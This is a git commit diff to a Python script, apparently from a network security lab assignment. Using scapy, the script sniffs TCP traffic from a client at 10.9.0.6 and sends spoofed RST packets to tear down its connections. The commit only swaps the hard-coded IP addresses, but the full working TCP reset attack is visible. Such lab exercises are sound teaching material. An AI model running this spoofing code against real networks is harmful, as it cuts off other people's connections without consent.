16a6355dd6bf30f64f14ecdd4c65ca30c88f1706
Austin Tyler Conn <austinc3030@users.noreply.github.com>
2023-03-28 20:06:57 -0400

    Update task2 automatex

--- src/task2_automated.py
+++ src/task2_automated.py
@@ -2,12 +2,11 @@
 from scapy.all import *
 import sys
 
-strSourceIP = "10.9.0.1"
-strDestinationIP = "10.9.0.5"
+strClientIP = "10.9.0.6"
 
 def spoof_tcp(pkt):
 
-    lyrIP = IP(dst = "10.0.2.15", src = pkt[IP].dst)
+    lyrIP = IP(dst=strClientIP, src = pkt[IP].dst)
     lyrTCP = TCP(flags="R", seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport)
     
     # Build the spoofed packet
@@ -16,5 +15,5 @@ def spoof_tcp(pkt):
     # Send the spoofed packet
     send(pktSpoofedPacket, verbose=0)
 
-pkt = sniff(filter='tcp and src host {}'.format(strSourceIP),
+pkt = sniff(filter='tcp and src host {}'.format(strClientIP),
             prn=spoof_tcp)
